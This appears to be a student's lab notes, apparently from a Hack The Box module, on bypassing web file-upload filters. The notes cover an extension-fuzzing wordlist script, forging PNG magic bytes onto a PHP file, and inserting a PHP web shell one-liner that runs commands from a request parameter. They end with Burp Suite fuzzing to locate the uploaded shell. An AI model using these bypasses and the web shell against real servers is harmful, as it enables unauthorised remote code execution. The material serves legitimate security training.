## Helpful Script

```bash 
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.pht' '.phtm' '.phar' '.pgif'; do
        echo "shell.png$ext" >> wordlist1.txt
        echo "shell$ext.png" >> wordlist.txt 

        echo "shell$char$ext.jpg" >> wordlist1.txt
        echo "shell$ext$char.jpg" >> wordlist1.txt
        echo "shell.jpg$char$ext" >> wordlist1.txt
        echo "shell.jpg$ext$char" >> wordlist1.txt
    done
done
```
> You can add more like `.phar` to the second for loop and you can change the valid extension
such as changing it from `.jpg` to `.png`. 

## After Successful Upload of a Valid Image File 
After I uploaded a valid `.png` file of a Google logo, I know that the website for sure 
takes in `.png`. I can leverage this knowledge and extract the first few bytes of the .png 
file I uploaded. To do this, i can use the command: 

```bash
xxd test.png | head
```

The output of this command will look something like: 

```bash 
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 00cc 0000 00c0 0803 0000 007f 3e7c  ..............>|
00000020: bb00 0001 3850 4c54 45ff ffff e941 3534  ....8PLTE....A54
00000030: a853 4285 f4fa bb08 3e83 f49b baf8 2e7c  .SB.....>......|
00000040: f3ee f3fd 6799 f6fa b900 e93f 33fa b500  ....g......?3...
00000050: 30a7 50fa b700 3780 f4e9 3a2d e836 28fe  0.P...7...:-.6(.
00000060: fafa e830 20f2 9893 23a4 48f7 fbf8 fce9  ...0 ...#.H.....
00000070: e8fe f5f5 e724 0ff1 938e e716 00fb c200  .....$..........
00000080: fff9 eefb c12d fffd f9df e9fd 14a1 40fa  .....-........@.
00000090: d7d5 f5b4 b1f7 c1be eb54 4aec 6860 f8ca  .........TJ.h`..
```

You only need to extract the first line and you can do it like: 

```bash 
echo -n -e '\x89\x50\x4e\x47...' > test.php
```

> `\x` introduces a `hexadecimal escape sequence`

Note that if you try `file test.php` it will show it as a `PNG` file. Now you can upload this file to the web application and intercept the request and just create a new line and add a malicious PHP script like: `<?php passthru($_REQUEST['cmd']); ?>`

## Problem: I can't append new content/data to test.php
```bash
total 16
-rw-r--r-- 1 root           root            174 Feb 10 02:13 phpextensions.lst
-rw-r--r-- 1 root           root             61 Feb 10 02:55 test.php
-rw-r--r-- 1 htb-ac-1434522 htb-ac-1434522 3163 Feb 10 01:30 test.png
-rw-r--r-- 1 root           root             13 Feb 10 01:53 test.txt
```

### Solution: 
The command:  
```bash
sudo chown htb-ac-1434522:htb-ac-1434522 test.php
```
### Breakdown:
- `sudo` → Runs the command with **superuser (root) privileges**, required because `test.php` is owned by `root`.
- `chown` → Changes the **owner** of a file.
- `htb-ac-1434522:htb-ac-1434522` →  
  - The first part (`htb-ac-1434522`) sets the **user** (who owns the file).  
  - The second part (`htb-ac-1434522`) sets the **group** (who can access it).  
- `test.php` → The file whose ownership is being changed.

> The command 'whoami' prints out the current user. 'htb-ac-14...' is the result of whoami
hence I use it in the `sudo chown` command sequence to change ownership from root to myself

> The `owner` of a file is the user who has primary control over a file (can read, write, or execute based on permissions)

> The `group` is a set of users. If a file belongs to a group, all users in that group can access it based on the file's group permissions 

### Effect:
After running this command, `test.php` will be owned by **your user**, allowing you to modify it without `sudo`.


## Final Notes
After you use the first bash script and its generated wordlist in burp suite, you can assume that burp suite sent actual requests to the web application, but you don't know which requests, or files, return a runnable script. So you can close out of the intruder tab and go back to the intercepted request from earlier then change the request method to `GET`. And then, you can fuzz for the paths to the different file paths using the same exact wordlist from earlier! 
